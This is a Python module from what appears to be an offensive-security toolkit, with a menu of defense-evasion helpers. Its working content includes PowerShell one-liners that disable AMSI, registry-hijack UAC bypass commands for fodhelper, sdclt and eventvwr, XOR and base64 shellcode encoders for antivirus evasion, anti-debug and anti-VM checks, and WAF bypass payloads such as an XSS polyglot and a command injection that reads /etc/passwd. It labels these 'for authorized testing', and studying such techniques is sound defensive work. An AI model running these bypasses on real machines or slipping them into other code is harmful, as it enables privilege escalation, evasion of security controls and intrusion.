from __future__ import annotations

import base64
import os
import random
import string
import subprocess
import sys

from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause, report

# ---------------------------------------------------------------------------
# AMSI bypass – generate obfuscated PowerShell one-liners that patch AMSI
# ---------------------------------------------------------------------------
_AMSI_TECHNIQUES = {
    "reflection": (
        'Reflex Assembly Load – patches AmsiScanBuffer via reflection.\n'
        '[bright_black]$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");'
        '$a.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)[/]'
    ),
    "force-error": (
        'Force AMSI Init Error – sets amsiInitFailed by triggering an exception.\n'
        '[bright_black]$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");'
        '$a.GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)[/]'
    ),
    "dll-hijack": (
        'DLL Hijack – load a rogue amsi.dll from the working directory.\n'
        '[bright_black]Place a custom amsi.dll next to the PowerShell binary.[/]'
    ),
}


def amsi_bypass() -> None:
    header("AMSI Bypass Generator")
    console.print("Generate AMSI bypass payloads for authorized testing.\n")
    for k, v in _AMSI_TECHNIQUES.items():
        console.print(f"  [cyan]{k}[/] — {v.split(chr(10))[0]}")
    choice = Prompt.ask("Technique", choices=list(_AMSI_TECHNIQUES), default="reflection")
    desc = _AMSI_TECHNIQUES[choice]
    console.print(Panel(desc, title=f"AMSI Bypass — {choice}", border_style="yellow"))
    report("AMSI bypass", f"technique={choice}")
    pause()


# ---------------------------------------------------------------------------
# UAC bypass – catalogue of known UAC bypass techniques
# ---------------------------------------------------------------------------
_UAC_METHODS = {
    "fodhelper": {
        "desc": "fodhelper.exe auto-elevate (registry hijack)",
        "cmd": 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f && fodhelper.exe',
        "binary": "fodhelper.exe",
    },
    "computerdefaults": {
        "desc": "computerdefaults.exe auto-elevate (registry hijack)",
        "cmd": 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "cmd.exe" /f && computerdefaults.exe',
        "binary": "computerdefaults.exe",
    },
    "sdclt": {
        "desc": "sdclt.exe isolated command (registry hijack)",
        "cmd": 'reg add HKCU\\Software\\Classes\\exefile\\shell\\open\\command /ve /d "cmd.exe" /f && sdclt.exe',
        "binary": "sdclt.exe",
    },
    "eventvwr": {
        "desc": "eventvwr.exe auto-elevate (registry hijack, legacy)",
        "cmd": 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd.exe" /f && eventvwr.exe',
        "binary": "eventvwr.exe",
    },
}


def uac_bypass() -> None:
    header("UAC Bypass Techniques")
    console.print("Known UAC bypass methods for authorized Windows testing.\n")
    tbl = Table(title="UAC Bypass Catalogue", border_style="yellow")
    tbl.add_column("Key", style="cyan")
    tbl.add_column("Binary")
    tbl.add_column("Description")
    for k, v in _UAC_METHODS.items():
        tbl.add_row(k, v["binary"], v["desc"])
    console.print(tbl)
    choice = Prompt.ask("Method (enter to skip)", default="")
    if choice in _UAC_METHODS:
        m = _UAC_METHODS[choice]
        console.print(Panel(m["cmd"], title=f"UAC Bypass — {m['binary']}", border_style="yellow"))
        report("UAC bypass", f"method={choice} binary={m['binary']}")
    pause()


# ---------------------------------------------------------------------------
# AV evasion – payload encoding / obfuscation helpers
# ---------------------------------------------------------------------------
def av_evasion() -> None:
    header("AV Evasion Helpers")
    console.print("Encode payloads to reduce static detection.\n")
    console.print("  [cyan]1[/]  XOR-encode a shellcode blob (hex)")
    console.print("  [cyan]2[/]  Base64 + XOR layer")
    console.print("  [cyan]3[/]  Generate random variable names for PS payload")
    choice = Prompt.ask("Option", choices=["1", "2", "3"], default="1")
    if choice == "1":
        raw = Prompt.ask("Shellcode (hex, no spaces)")
        try:
            data = bytes.fromhex(raw)
        except ValueError:
            console.print("[red]Invalid hex.[/]")
            return pause()
        key = int(Prompt.ask("XOR key (0-255)", default="170"))
        enc = bytes(b ^ key for b in data)
        console.print(f"[green]XOR-encoded (hex):[/] {enc.hex()}")
        console.print(f"[bright_black]Decoder: python -c \"import sys;key={key};"
                      f"print(bytes(b^key for b in bytes.fromhex('{enc.hex()}')))\"[/]")
        report("AV evasion", f"xor key={key} in={len(data)}B out={len(enc)}B")
    elif choice == "2":
        raw = Prompt.ask("Payload string")
        key = Prompt.ask("XOR key (string)", default="nullsec")
        xored = bytes(b ^ ord(key[i % len(key)]) for i, b in enumerate(raw.encode()))
        b64 = base64.b64encode(xored).decode()
        console.print(f"[green]Base64(XOR(payload)):[/] {b64}")
        report("AV evasion", f"b64+xor key='{key}' in={len(raw)}B")
    elif choice == "3":
        count = int(Prompt.ask("How many variable names", default="5"))
        names = set()
        while len(names) < count:
            names.add("".join(random.choices(string.ascii_letters, k=random.randint(8, 16))))
        for n in sorted(names):
            console.print(f"  ${n}")
        report("AV evasion", f"generated {count} random var names")
    pause()


# ---------------------------------------------------------------------------
# Anti-debug / anti-VM checks
# ---------------------------------------------------------------------------
def anti_debug() -> None:
    header("Anti-Debug Checks")
    console.print("Detect if the current process is being debugged.\n")
    checks = []
    if sys.platform == "win32":
        try:
            import ctypes
            is_debug = ctypes.windll.kernel32.IsDebuggerPresent()
            checks.append(("IsDebuggerPresent", bool(is_debug)))
            ct = ctypes.c_ulong()
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ct))
            checks.append(("CheckRemoteDebuggerPresent", bool(ct.value)))
        except Exception as ex:
            checks.append(("win32 debug check", f"error: {ex}"))
    else:
        try:
            status = open("/proc/self/status").read()
            tracer = [l for l in status.splitlines() if l.startswith("TracerPid")]
            pid = tracer[0].split(":")[1].strip() if tracer else "0"
            checks.append(("TracerPid", pid != "0"))
        except Exception:
            checks.append(("/proc/self/status", "unavailable"))
    for name, val in checks:
        color = "red" if val else "green"
        console.print(f"  [{color}]{name}[/]: {val}")
    report("Anti-debug", str(checks))
    pause()


def anti_vm() -> None:
    header("Anti-VM / Sandbox Checks")
    console.print("Detect virtualized or sandboxed environments.\n")
    indicators = []
    if sys.platform == "win32":
        try:
            import ctypes
            buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.kernel32.GetSystemFirmwareTable(
                0x4649524D, 0, buf, 256)  # 'RSMB'
            indicators.append(("SMBIOS via GetSystemFirmwareTable", buf.value[:80]))
        except Exception:
            pass
        for env in ["VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V"]:
            if os.path.exists(f"C:\\Windows\\System32\\drivers\\{env.lower()}.sys"):
                indicators.append((f"Driver {env}", True))
    # MAC OUI prefixes common to VMs
    vm_macs = {"00:0c:29", "00:50:56", "08:00:27", "52:54:00", "00:15:5d"}
    try:
        import uuid
        mac = uuid.getnode()
        mac_str = ":".join(f"{(mac >> ele) & 0xff:02x}" for ele in range(40, -1, -8))
        oui = mac_str[:8].lower()
        for prefix in vm_macs:
            if oui.startswith(prefix):
                indicators.append(("VM MAC prefix", f"{oui} ({prefix})"))
    except Exception:
        pass
    # CPU feature check
    try:
        cpuinfo = open("/proc/cpuinfo").read() if os.path.exists("/proc/cpuinfo") else ""
        if "hypervisor" in cpuinfo:
            indicators.append(("CPU hypervisor flag", True))
    except Exception:
        pass
    if not indicators:
        console.print("  [green]No VM indicators detected.[/]")
    else:
        for name, val in indicators:
            console.print(f"  [yellow]{name}[/]: {val}")
    report("Anti-VM", str(indicators))
    pause()


# ---------------------------------------------------------------------------
# DEP check
# ---------------------------------------------------------------------------
def dep_check() -> None:
    header("DEP / ASLR Status Check")
    console.print("Check Data Execution Prevention and ASLR status.\n")
    if sys.platform == "win32":
        try:
            r = subprocess.run(["wmic", "os", "get", "DataExecutionPrevention_Available"],
                               capture_output=True, text=True, timeout=5)
            console.print(f"  DEP available: {r.stdout.strip().split()[-1]}")
        except Exception:
            console.print("  [yellow]Could not query DEP status.[/]")
    else:
        # Check NX bit via /proc
        try:
            flags = open("/proc/cpuinfo").read()
            console.print(f"  NX bit: {'yes' if 'nx' in flags.lower() else 'no'}")
        except Exception:
            console.print("  [yellow]Could not check NX bit.[/]")
    console.print("\n  [bright_black]Bypass techniques:[/]")
    console.print("  - SetProcessDEPPolicy (Windows < 8)")
    console.print("  - NtSetInformationProcess (ProcessDEPPolicy)")
    console.print("  - VirtualProtect + PAGE_EXECUTE_READWRITE")
    console.print("  - ROP chains to call SETDEP")
    report("DEP check", "checked")
    pause()


# ---------------------------------------------------------------------------
# WAF bypass – payload generation
# ---------------------------------------------------------------------------
_WAF_PAYLOADS = {
    "sqlmap-tamper": "sqlmap --tamper=between,randomcase,space2comment --random-agent",
    "xss-encoding": "<svg/onload=alert(1)> → %3Csvg%2Fonload%3Dalert(1)%3E",
    "xss-breakout": "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "cmd-injection": "; cat /etc/passwd # → %3B%20cat%20%2Fetc%2Fpasswd%20%23",
    "header-spoof": "X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin",
}


def waf_bypass() -> None:
    header("WAF Bypass Payloads")
    console.print("Common WAF evasion techniques for authorized testing.\n")
    tbl = Table(title="WAF Bypass Catalogue", border_style="yellow")
    tbl.add_column("Technique", style="cyan")
    tbl.add_column("Payload / Method")
    for k, v in _WAF_PAYLOADS.items():
        tbl.add_row(k, v[:80])
    console.print(tbl)
    choice = Prompt.ask("Copy which payload? (enter to skip)", default="")
    if choice in _WAF_PAYLOADS:
        console.print(f"\n[green]{_WAF_PAYLOADS[choice]}[/]")
        report("WAF bypass", choice)
    pause()


# ---------------------------------------------------------------------------
# Menu
# ---------------------------------------------------------------------------
MENU = {
    "1": ("AMSI bypass generator", amsi_bypass),
    "2": ("UAC bypass catalogue", uac_bypass),
    "3": ("AV evasion helpers", av_evasion),
    "4": ("Anti-debug checks", anti_debug),
    "5": ("Anti-VM / sandbox checks", anti_vm),
    "6": ("DEP / ASLR status check", dep_check),
    "7": ("WAF bypass payloads", waf_bypass),
}
